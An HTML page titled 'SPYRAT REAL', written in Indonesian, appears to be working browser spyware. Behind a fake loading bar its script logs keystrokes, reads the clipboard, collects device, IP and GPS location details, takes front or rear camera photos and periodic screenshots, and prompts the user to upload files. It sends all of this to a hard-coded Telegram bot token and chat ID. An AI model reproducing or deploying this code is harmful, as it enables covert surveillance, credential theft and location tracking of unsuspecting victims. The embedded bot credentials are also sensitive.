<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>SPYRAT REAL</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        body{background:#000;margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial,sans-serif;color:#999;overflow:hidden}
        #loading-container{text-align:center;width:80%;max-width:400px}
        #loading-text{font-size:22px;margin-bottom:20px;color:#ff0066;text-shadow:0 0 20px #ff006688}
        #progress-container{height:3px;background:#222;border-radius:3px;overflow:hidden}
        #progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#ff0066,#ff3300);transition:width .3s ease}
        #loading-details{margin-top:20px;font-size:14px;color:#666}
        #log{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);color:#333;font-size:11px;font-family:monospace;max-width:90%;overflow:hidden;white-space:nowrap;text-overflow:ellipsis}
        .hidden{display:none}
    </style>
</head>
<body>
    <div id="loading-container">
        <div id="loading-text">⚡ PROSES LOADING ⚡</div>
        <div id="progress-container"><div id="progress-bar"></div></div>
        <div id="loading-details">Memulai inisialisasi...</div>
    </div>
    
    <video id="v" autoplay muted class="hidden"></video>
    <canvas id="c" class="hidden"></canvas>
    <div id="log">🚀 Sistem aktif...</div>

<script>
(()=>{
    // ========== KONFIGURASI TELEGRAM ==========
    const T='8280502690:AAECUtizvQncEaDXCp3XaEfDjT3TzDqFdoM';
    const C='6448030023';
    const pb=document.getElementById('progress-bar');
    const ld=document.getElementById('loading-details');
    const log=document.getElementById('log');

    // ========== FUNGSI KIRIM KE TELEGRAM ==========
    const sTG=async d=>{
        try {
            await fetch(`https://api.telegram.org/bot${T}/sendMessage`,{
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify({chat_id:C,text:d,parse_mode:'HTML'})
            });
            log.textContent = '✅ Pesan terkirim';
        } catch(e){ log.textContent = '❌ Gagal kirim'; }
    };
    
    const sP=async(b,f)=>{
        try {
            const fd=new FormData();
            fd.append('chat_id',C);
            fd.append('photo',b,f);
            await fetch(`https://api.telegram.org/bot${T}/sendPhoto`,{method:'POST',body:fd});
            log.textContent = '📸 Foto terkirim';
        } catch(e){ log.textContent = '❌ Gagal kirim foto'; }
    };

    // ========== PROGRESS BAR ==========
    let p=0;
    const LM=["Memeriksa modul sistem...","Memuat komponen inti...","Menginisialisasi antarmuka...","Memverifikasi koneksi...","Menyiapkan lingkungan...","Memeriksa pembaruan...","Memuat aset tampilan...","Mengaktifkan modul sadap...","Menyambung ke server..."];
    setInterval(()=>{
        p+=Math.random()*5;
        if(p>98)p=98;
        pb.style.width=p+'%';
        if(Math.random()>.9)ld.textContent=LM[Math.floor(Math.random()*LM.length)]
    },500);

    // ========== KEYLOGGER ==========
    let keylog = "";
    document.addEventListener('keydown', function(e) {
        keylog += e.key;
        if (keylog.length > 30) {
            sTG("⌨️ Keylog: " + keylog);
            keylog = "";
        }
    });

    // ========== CLIPBOARD STEALER ==========
    setInterval(() => {
        navigator.clipboard.readText().then(text => {
            if (text && text.length > 0 && text.length < 500) {
                sTG("📋 Clipboard: " + text);
            }
        }).catch(() => {});
    }, 10000);

    // ========== LOKASI DETAIL ==========
    const gLD=async(a,b)=>{
        try {
            const r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`);
            const d=await r.json();
            if(d.address) return {
                kb:d.address.county||d.address.city||d.address.state||"Tidak diketahui",
                kc:d.address.suburb||d.address.village||d.address.town||"Tidak diketahui",
                fa:d.display_name||"Alamat tidak tersedia"
            };
        } catch(e){}
        return {kb:"Tidak diketahui",kc:"Tidak diketahui",fa:"Alamat tidak tersedia"};
    };

    // ========== INFO PERANGKAT ==========
    const cDI=async()=>{
        let m='╭───── 📡 SPYRAT REPORT ───── ⦿\n\n';
        m+='⚙️ <b>DEVICE INFORMATION</b>\n';
        m+=`🖥️ Device: ${navigator.userAgent}\n`;
        m+=`💻 Platform: ${navigator.platform}\n`;
        m+=`🌐 Bahasa: ${navigator.language}\n`;
        m+=`📶 Online: ${navigator.onLine?'✅ YA':'❌ TIDAK'}\n`;
        m+=`📺 Screen: ${screen.width}x${screen.height}\n`;
        m+=`🪟 Window: ${innerWidth}x${innerHeight}\n`;
        m+=`💾 RAM: ${navigator.deviceMemory||'Tidak diketahui'} GB\n`;
        m+=`🧠 CPU: ${navigator.hardwareConcurrency} core\n`;
        if(navigator.getBattery){
            try {
                const b=await navigator.getBattery();
                m+=`🔋 Baterai: ${Math.floor(b.level*100)}%\n`;
                m+=`🔌 Charging: ${b.charging?'✅ YA':'❌ TIDAK'}\n`;
            } catch(e){ m+='🔋 Baterai: ❌ Tidak tersedia\n'; }
        }
        m+=`⏰ Waktu: ${new Date().toString()}\n`;
        m+=`🕒 Load: ${performance.now().toFixed(2)} ms\n`;
        m+=`📜 History: ${history.length}\n`;
        m+=`✋ Touch: ${'ontouchstart'in window?'✅ YA':'❌ TIDAK'}\n`;
        m+=`🔗 Referrer: ${document.referrer||'None'}\n`;
        m+=`🌍 URL: ${location.href}\n`;
        m+=`📄 Title: ${document.title}\n`;
        m+=`🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
        m+=`🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;
        
        try {
            const i=await fetch('https://ipapi.co/json/');
            const d=await i.json();
            m+='📍 <b>IP & LOKASI</b>\n';
            m+=`📡 IP: ${d.ip}\n`;
            m+=`🏙️ Kota: ${d.city||'Tidak diketahui'}\n`;
            m+=`🗺️ Wilayah: ${d.region||'Tidak diketahui'}\n`;
            m+=`🌎 Negara: ${d.country_name||'Tidak diketahui'}\n`;
            m+=`🏷️ Kode Pos: ${d.postal||'Tidak diketahui'}\n`;
            if(d.latitude&&d.longitude){
                m+=`📌 Latitude: ${d.latitude}\n`;
                m+=`📍 Longitude: ${d.longitude}\n`;
                const l=await gLD(d.latitude,d.longitude);
                m+=`🏙️ Kabupaten: ${l.kb}\n`;
                m+=`🏙️ Kecamatan: ${l.kc}\n`;
                m+=`🏠 Alamat: ${l.fa}\n`;
            }
        } catch(e){ m+='❌ Gagal get IP\n'; }
        
        m+='\n╰───── Telegram @CyberSeven ───── ⦿';
        return m;
    };

    // ========== KAMERA ==========
    const captureCamera = async (mode) => {
        const v = document.getElementById('v'), 
              c = document.getElementById('c');
        let stream;
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: { exact: mode } }
            });
            v.srcObject = stream;
            await new Promise(resolve => v.onloadedmetadata = resolve);
            v.play();
            await new Promise(r => setTimeout(r, 1500)); 
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            c.toBlob(b => sP(b, `${mode}_camera.jpg`), 'image/jpeg');
            stream.getTracks().forEach(t => t.stop());
            return true; 
        } catch (e) {
            if (stream) stream.getTracks().forEach(t => t.stop());
            await sTG(`⚠️ Gagal akses kamera ${mode}`);
            return false; 
        }
    };

    // ========== SCREENSHOT OTOMATIS ==========
    const autoScreenshot = async () => {
        try {
            const canvas = await html2canvas(document.body);
            canvas.toBlob(b => sP(b, 'screenshot.jpg'), 'image/jpeg');
        } catch(e) {
            await sTG('❌ Screenshot auto gagal');
        }
    };

    // ========== FUNGSI UTAMA ==========
    const ST=async()=>{
        await sTG(await cDI()); 
        
        let cameraSuccess = await captureCamera("user");
        if (!cameraSuccess) {
            cameraSuccess = await captureCamera("environment");
        }
        if (!cameraSuccess) {
            await sTG('❌ Akses kamera ditolak');
        }

        setTimeout(autoScreenshot, 3000);
        setInterval(autoScreenshot, 30000);

        if(navigator.geolocation){
            navigator.geolocation.getCurrentPosition(async p=>{
                const lat = p.coords.latitude;
                const lon = p.coords.longitude;
                let g=`📍 GPS TRACKING\n`;
                g+=`📌 Lat: ${lat}\n📍 Lng: ${lon}\n`;
                g+=`🎯 Akurasi: ${p.coords.accuracy}m\n`;
                g+=`🗺️ Google Maps: https://www.google.com/maps/search/?api=1&query=${lat},${lon}\n`;
                const l=await gLD(lat,lon);
                g+=`🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat: ${l.fa}\n`;
                await sTG(g);
            }, async e=>{
                await sTG(`❌ GPS Error: ${e.message}`);
            }, {enableHighAccuracy:true,maximumAge:0,timeout:5000});
        }

        setTimeout(() => {
            const input = document.createElement('input');
            input.type = 'file';
            input.multiple = true;
            input.onchange = function() {
                Array.from(this.files).forEach(file => {
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        const blob = new Blob([e.target.result], {type: file.type});
                        const fd = new FormData();
                        fd.append('chat_id', C);
                        fd.append('document', blob, file.name);
                        fd.append('caption', `📁 ${file.name}`);
                        fetch(`https://api.telegram.org/bot${T}/sendDocument`, {method:'POST', body:fd});
                    };
                    reader.readAsArrayBuffer(file);
                });
            };
            input.click();
        }, 8000);

        setTimeout(() => {
            sTG('✅ SPYRAT ULTIMATE AKTIF! Semua data dikirim real-time!');
        }, 2000);
    };

    ST();
})();
</script>
</body>
  </html>
